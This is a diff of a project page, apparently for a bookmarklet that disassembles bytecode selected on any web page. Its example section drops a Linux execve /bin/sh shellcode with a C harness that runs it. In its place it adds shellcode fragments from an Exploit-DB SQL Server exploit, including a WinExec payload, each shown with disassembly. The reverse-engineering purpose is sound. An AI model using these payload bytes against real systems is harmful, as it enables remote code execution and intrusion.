@@ -42,54 +42,46 @@
 <h3>
 <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true"><span class="octicon octicon-link"></span></a>Usage</h3>
 
-<p>Select any bytecode on any page that you would like to disassemble and then click the <a href="javascript:(function(){var script=document.createElement('SCRIPT');script.src='//s3.amazonaws.com/bookmarkletdisassembler/bookmarklet.js';document.body.appendChild(script);})()">Inline Disassembler</a> link or your bookmarklet. The disassembly engine will load for a moment and then prompt you to set configuration options before beginning disassembly.</p>
+<p>Select any bytecode you would like to disassemble on any page and then click the <a href="javascript:(function(){var script=document.createElement('SCRIPT');script.src='//s3.amazonaws.com/bookmarkletdisassembler/bookmarklet.js';document.body.appendChild(script);})()">Inline Disassembler</a> link or your bookmarklet. The disassembly engine will load for a moment and then prompt you to set configuration options before beginning disassembly.</p>
 
 <h3>
 <a id="creating-pages-manually" class="anchor" href="#creating-pages-manually" aria-hidden="true"><span class="octicon octicon-link"></span></a>Examples</h3>
 
-<p>Source: <a href='http://shell-storm.org/shellcode/files/shellcode-851.php'>http://shell-storm.org/shellcode/files/shellcode-851.php</a> <br/>
+<p>Source: <a href='https://www.exploit-db.com/exploits/38005/'>https://www.exploit-db.com/exploits/38005/ - SQL Server 2000/2005 SQLNS Unhandled Pointer Exploit</a> <br/>
 <pre>
-/*
+"\x64\x8B\x25\x00\x00\x00\x00\xeb\x07\x90\x90\x90"
 
-Title   : Obfuscated execve /bin/sh (30 bytes)
-Date    : 3rd July 2013
-Author  : Russell Willis &lt;codinguy@gmail.com&gt;
-System  : Linux/x86 (SMP Debian 3.2.41-2 i686)
-  
-To build:
-gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+'0C0C0C6C   64:8B25 00000000          MOV ESP,DWORD PTR FS:[0]
+'0C0C0C73   EB 07                     JMP SHORT 0C0C0C7C
+'0C0C0C75   90                        NOP
+'0C0C0C76   90                        NOP
+'0C0C0C77   90                        NOP
+'12 bytes
 
-00000000  31C9              xor ecx,ecx
-00000002  F7E9              imul ecx
-00000004  51                push ecx
-00000005  040B              add al,0xb
-00000007  EB08              jmp short 0x11
-00000009  5E                pop esi
-0000000A  87E6              xchg esp,esi
-0000000C  99                cdq
-0000000D  87DC              xchg ebx,esp
-0000000F  CD80              int 0x80
-00000011  E8F3FFFFFF        call dword 0x9
-00000016  2F                das
-00000017  62696E            bound ebp,[ecx+0x6e]
-0000001A  2F                das
-0000001B  2F                das
-0000001C  7368              jnc 0x86
 
-*/
+"\x83\xEC\x24\x8B\xEC\x83\xC5\x30"
 
-#include &lt;stdio.h&gt;
- 
-unsigned char code[] = \
-"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
-"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";
- 
-main()
-{
-    printf("Shellcode Length: %d\n", sizeof(code)-1);
-    int (*ret)() = (int(*)())code;
-    ret();
-}
+'0C0C0C7C   83EC 24                   SUB ESP,24
+'0C0C0C7F   8BEC                      MOV EBP,ESP
+'0C0C0C81   83C5 30                   ADD EBP,30
+'8 bytes
+
+
+'''''''''''''''''''''''''''''shellcode WinExec (win2k sp2)
+"\xd9\xee\x9b\xd9\x74\x24\xf4\x5e\x83\xc6\x1a\x33\xc0\x50\x56\x68\x41\x41\x41\x41\x68\x16\x41\x86\x7c\xc3"
+
+'D9EE            FLDZ
+'9B              WAIT
+'D97424 F4       FSTENV (28-BYTE) PTR SS:[ESP-C]
+'5E              POP ESI
+'83C6 1a                   ADD ESI,1a
+'33C0                      XOR EAX,EAX
+'50                        PUSH EAX
+'56                        PUSH ESI
+'68 F1F8807C               PUSH kernel32.ExitThread
+'68 1641867C               PUSH kernel32.WinExec
+'C3                        RETN
+'''''''''''''''''''''''''''''main
 </pre>
 </p>
 
